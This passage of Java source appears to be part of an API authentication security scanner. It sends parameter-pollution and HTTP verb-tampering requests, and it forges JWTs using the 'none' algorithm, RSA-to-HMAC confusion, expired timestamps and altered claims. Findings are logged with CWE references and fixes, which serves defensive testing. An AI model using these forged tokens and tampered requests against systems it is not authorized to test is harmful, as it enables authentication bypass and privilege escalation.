                logCallback.accept("⚠️ Role manipulation test error: " + e.getMessage());
            }
        }
    }
    
    private void testParameterPollution(CloseableHttpClient client, String url, 
                                      List<Vulnerability> vulnerabilities, 
                                      Consumer<String> logCallback) {
        
        try {
            HttpPost request = new HttpPost(url + "/api/user");
            request.setHeader("Content-Type", "application/x-www-form-urlencoded");
            if (config.getAuthorizationHeader() != null) {
                request.setHeader("Authorization", config.getAuthorizationHeader());
            }
            
            String payload = "role=user&role=admin&permissions=read&permissions=write&permissions=admin";
            request.setEntity(new StringEntity(payload));
            
            try (CloseableHttpResponse response = client.execute(request)) {
                logCallback.accept("🧪 Parameter pollution test → " + response.getCode());
                
                if (response.getCode() == 200) {
                    String responseBody = EntityUtils.toString(response.getEntity());
                    if (responseBody.contains("admin") || responseBody.contains("write")) {
                        vulnerabilities.add(createVulnerability("HIGH", "Parameter Pollution", url,
                            "Parameter pollution allows privilege escalation",
                            "Duplicate parameters processed incorrectly",
                            "Implement proper parameter validation and handle duplicates securely"));
                        logCallback.accept("🚨 HIGH: Parameter pollution detected!");
                    }
                }
            }
            
        } catch (Exception e) {
            logCallback.accept("⚠️ Parameter pollution test error: " + e.getMessage());
        }
    }
    
    private void testHttpVerbTampering(CloseableHttpClient client, String url, 
                                     List<Vulnerability> vulnerabilities, 
                                     Consumer<String> logCallback) {
        
        String[] methods = {"PUT", "PATCH", "DELETE"};
        
        for (String method : methods) {
            try {
                HttpUriRequestBase request = switch (method) {
                    case "PUT" -> new HttpPut(url + "/api/admin");
                    case "PATCH" -> new HttpPatch(url + "/api/admin");
                    case "DELETE" -> new HttpDelete(url + "/api/admin");
                    default -> null;
                };
                
                if (request != null) {
                    if (config.getAuthorizationHeader() != null) {
                        request.setHeader("Authorization", config.getAuthorizationHeader());
                    }
                    
                    try (CloseableHttpResponse response = client.execute(request)) {
                        logCallback.accept("🧪 HTTP verb tampering: " + method + " → " + response.getCode());
                        
                        if (response.getCode() == 200) {
                            vulnerabilities.add(createVulnerability("MEDIUM", "HTTP Verb Tampering", url,
                                "HTTP verb tampering allows unauthorized access",
                                method + " method granted access to protected resource",
                                "Implement proper HTTP method validation and authorization"));
                            logCallback.accept("⚠️ MEDIUM: HTTP verb tampering detected!");
                        }
                    }
                }
                
                Thread.sleep(100);
            } catch (Exception e) {
                logCallback.accept("⚠️ HTTP verb tampering test error: " + e.getMessage());
            }
        }
    }
    
    private String createNoneAlgorithmToken(DecodedJWT jwt) {
        try {
            String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
            String payload = new String(Base64.getUrlDecoder().decode(jwt.getPayload()));
            
            return Base64.getUrlEncoder().withoutPadding().encodeToString(header.getBytes()) + "." +
                   Base64.getUrlEncoder().withoutPadding().encodeToString(payload.getBytes()) + ".";
        } catch (Exception e) {
            return null;
        }
    }
    
    private String createRsaToHmacToken(DecodedJWT jwt) {
        try {
            String header = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
            String payload = new String(Base64.getUrlDecoder().decode(jwt.getPayload()));
            
            Algorithm algorithm = Algorithm.HMAC256("public-key-as-secret");
            return JWT.create()
                .withHeader(Map.of("alg", "HS256", "typ", "JWT"))
                .withPayload(payload)
                .sign(algorithm);
        } catch (Exception e) {
            return null;
        }
    }
    
    private String createExpiredToken(DecodedJWT jwt) {
        try {
            String payload = new String(Base64.getUrlDecoder().decode(jwt.getPayload()));
            
            if (config.getJwtSecret() != null) {
                Algorithm algorithm = Algorithm.HMAC256(config.getJwtSecret());
                return JWT.create()
                    .withPayload(payload)
                    .withExpiresAt(Date.from(Instant.now().minus(1, ChronoUnit.HOURS)))
                    .sign(algorithm);
            }
        } catch (Exception e) {
            return null;
        }
        return null;
    }
    
    private String createFutureToken(DecodedJWT jwt) {
        try {
            String payload = new String(Base64.getUrlDecoder().decode(jwt.getPayload()));
            
            if (config.getJwtSecret() != null) {
                Algorithm algorithm = Algorithm.HMAC256(config.getJwtSecret());
                return JWT.create()
                    .withPayload(payload)
                    .withNotBefore(Date.from(Instant.now().plus(1, ChronoUnit.HOURS)))
                    .sign(algorithm);
            }
        } catch (Exception e) {
            return null;
        }
        return null;
    }
    
    private String manipulateJwtClaim(DecodedJWT jwt, String claimName, String claimValue) {
        try {
            String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
            String originalPayload = new String(Base64.getUrlDecoder().decode(jwt.getPayload()));
            
            String manipulatedPayload = originalPayload.replaceAll(
                "\"" + claimName + "\"\\s*:\\s*\"[^\"]*\"", 
                "\"" + claimName + "\":\"" + claimValue + "\""
            );
            
            if (manipulatedPayload.equals(originalPayload)) {
                manipulatedPayload = originalPayload.replaceAll(
                    "\\}$", 
                    ",\"" + claimName + "\":\"" + claimValue + "\"}"
                );
            }
            
            return Base64.getUrlEncoder().withoutPadding().encodeToString(header.getBytes()) + "." +
                   Base64.getUrlEncoder().withoutPadding().encodeToString(manipulatedPayload.getBytes()) + ".";
        } catch (Exception e) {
            return null;
        }
    }
    
    private boolean containsApiKey(String content) {
        String[] patterns = {
            "api[_-]?key", "apikey", "access[_-]?key", "secret[_-]?key",
            "bearer[_-]?token", "auth[_-]?token", "jwt[_-]?token"
        };
        
        String lowerContent = content.toLowerCase();
        for (String pattern : patterns) {
            if (Pattern.compile(pattern).matcher(lowerContent).find()) {
                return true;
            }
        }
        return false;
    }
    
    private Vulnerability createVulnerability(String severity, String type, String endpoint, 
                                            String description, String details, String recommendation) {
        Vulnerability vuln = new Vulnerability();
        vuln.setSeverity(severity);
        vuln.setType(type);
        vuln.setEndpoint(endpoint);
        vuln.setDescription(description);
        vuln.setDetails(details);
        vuln.setRecommendation(recommendation);
        vuln.setAuthType(config.getAuthType().toString());
        vuln.setAttackVector(getAttackVector(type));
        vuln.setCveReference(getCveReference(type));
        vuln.setMitigationComplexity(getMitigationComplexity(type));
        return vuln;
    }
    
    private String getAttackVector(String vulnerabilityType) {
        return switch (vulnerabilityType) {
            case "Weak Credentials" -> "Remote - Credential Brute Force";
            case "Authentication Bypass" -> "Remote - Header Manipulation";
            case "Weak JWT Secret" -> "Remote - Token Forgery";
            case "Algorithm Confusion" -> "Remote - Cryptographic Attack";
            case "Expired Token Accepted" -> "Remote - Token Replay";
            case "JWT Manipulation" -> "Remote - Payload Tampering";
            case "JWT None Algorithm" -> "Remote - Signature Bypass";
            case "Weak API Key" -> "Remote - Key Enumeration";
            case "API Key Exposure" -> "Information Disclosure";
            case "API Key Brute Force" -> "Remote - Key Enumeration";
            case "OAuth2 Open Redirect" -> "Remote - URL Manipulation";
            case "OAuth2 Implicit Flow" -> "Remote - Token Interception";
            case "Missing OAuth2 State Parameter" -> "Remote - CSRF Attack";
            case "Session Fixation" -> "Remote - Session Manipulation";
            case "Session Cookie XSS" -> "Remote - JavaScript Injection";
            case "Insecure Session Cookie" -> "Network - Traffic Interception";
            case "Privilege Escalation" -> "Remote - Authorization Bypass";
            case "Parameter Pollution" -> "Remote - Request Manipulation";
            case "HTTP Verb Tampering" -> "Remote - Method Override";
            case "Unauthenticated Access" -> "Remote - Direct Access";
            default -> "Remote - Network Attack";
        };
    }
    
    private String getCveReference(String vulnerabilityType) {
        return switch (vulnerabilityType) {
            case "Weak JWT Secret" -> "CWE-798: Use of Hard-coded Credentials";
            case "Algorithm Confusion" -> "CWE-347: Improper Verification of Cryptographic Signature";
            case "JWT None Algorithm" -> "CWE-325: Missing Required Cryptographic Step";
            case "Authentication Bypass" -> "CWE-287: Improper Authentication";
            case "Privilege Escalation" -> "CWE-269: Improper Privilege Management";
            case "Session Fixation" -> "CWE-384: Session Fixation";
            case "Weak Credentials" -> "CWE-521: Weak Password Requirements";
            case "OAuth2 Open Redirect" -> "CWE-601: URL Redirection to Untrusted Site";
            case "API Key Exposure" -> "CWE-200: Exposure of Sensitive Information";
            case "Parameter Pollution" -> "CWE-235: Improper Handling of Duplicate Parameters";
            case "Unauthenticated Access" -> "CWE-306: Missing Authentication for Critical Function";
            default -> "CWE-200: Information Exposure";
        };
    }
    
    private String getMitigationComplexity(String vulnerabilityType) {
        return switch (vulnerabilityType) {
            case "Weak Credentials", "Weak JWT Secret", "Weak API Key" -> "Low - Change credentials/secrets";
            case "Algorithm Confusion", "JWT None Algorithm" -> "Medium - Update JWT library configuration";
            case "Authentication Bypass", "Privilege Escalation" -> "High - Redesign authentication logic";
            case "Session Fixation", "Session Cookie XSS" -> "Medium - Update session management";
            case "OAuth2 Open Redirect", "Missing OAuth2 State Parameter" -> "Medium - Update OAuth2 implementation";
            case "API Key Exposure" -> "Low - Remove exposed keys and rotate";
            case "Parameter Pollution", "HTTP Verb Tampering" -> "Medium - Update input validation";
            case "Unauthenticated Access" -> "High - Implement authentication layer";
            default -> "Medium - Standard security practices";
        };
    }
}